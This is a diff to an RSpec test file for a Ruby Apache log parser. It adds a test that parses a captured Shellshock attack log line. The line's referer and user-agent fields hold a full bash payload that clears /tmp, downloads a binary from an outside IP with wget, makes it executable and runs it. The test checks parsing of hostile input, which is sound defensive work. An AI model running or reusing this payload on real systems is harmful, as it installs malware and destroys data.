@@ -54,6 +54,16 @@ describe ApacheLog::Parser do
     expect(entity).to eq(expect)
   end
 
+  it 'can parse attack log' do
+    line = '121.207.230.74 - - [13/Apr/2015:08:21:54 +0900] "GET / HTTP/1.1" 200 2392 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-orwj >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-orwj >> /tmp/Run.sh;echo /tmp/China.Z-orwj >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-orwj >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-orwj >> /tmp/Run.sh;echo /tmp/China.Z-orwj >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""'
+    parser = ApacheLog::Parser.new('combined')
+    entity = parser.parse(line.chomp)
+    expect = {remote_host: '121.207.230.74', identity_check: '-', user: '-',  datetime: DateTime.new(2015, 4, 13, 8,21,54, 0.375),
+      request: {method: 'GET', path: '/', protocol: 'HTTP/1.1' }, status: '200', size: '2392', referer: '() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-orwj >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-orwj >> /tmp/Run.sh;echo /tmp/China.Z-orwj >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"',
+      user_agent: '() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://61.160.212.172:911/java -O /tmp/China.Z-orwj >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-orwj >> /tmp/Run.sh;echo /tmp/China.Z-orwj >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"'}
+    expect(entity).to eq(expect)
+  end
+
   it 'can parse tab separated combined format log' do
     line = "192.168.0.1\t-\t-\t[07/Feb/2011:10:59:59 +0900]\t\"GET /x/i.cgi/movie/0001/-0002 HTTP/1.1\"\t200\t14462\t\"-\"\t\"DoCoMo/2.0 F08A3(c500;TB;W30H20)\"";
     parser = ApacheLog::Parser.new('combined')
